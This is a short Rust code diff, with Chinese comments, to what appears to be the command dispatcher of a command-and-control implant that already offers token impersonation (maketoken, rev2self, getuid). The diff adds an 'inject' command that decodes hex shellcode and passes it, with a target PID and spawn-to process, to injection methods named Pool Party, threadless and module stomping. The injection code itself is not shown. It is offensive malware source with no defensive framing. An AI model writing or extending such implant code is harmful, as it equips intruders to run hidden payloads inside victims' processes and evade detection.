@@ -851,6 +851,13 @@ enum JsonCommand {
     Rev2Self,
     /// 查询当前线程身份（DOMAIN\user + 是否持有令牌）。
     GetUid,
+    /// 注入 shellcode 到目标进程。method=0 Pool Party(暂走 stomp)/1 threadless/2 stomp。
+    Inject {
+        method: u8,
+        pid: u32,
+        spawn_to: String,
+        sc_hex: String,
+    },
     Exit,
 }
 
@@ -931,6 +938,11 @@ impl JsonCommand {
             },
             JsonCommand::Rev2Self => Command::Rev2Self,
             JsonCommand::GetUid => Command::GetUid,
+            JsonCommand::Inject { method, pid, spawn_to, sc_hex } => {
+                let shellcode = hex::decode(&sc_hex)
+                    .map_err(|_| "invalid hex in sc_hex")?;
+                Command::Inject { method, pid, spawn_to, shellcode }
+            }
             JsonCommand::Exit => Command::Exit,
         })
     }
@@ -1290,6 +1302,7 @@ fn command_name(c: &Command) -> &'static str {
         Command::MakeToken { .. } => "maketoken",
         Command::Rev2Self => "rev2self",
         Command::GetUid => "getuid",
+        Command::Inject { .. } => "inject",
         Command::Exit => "exit",
     }
 }
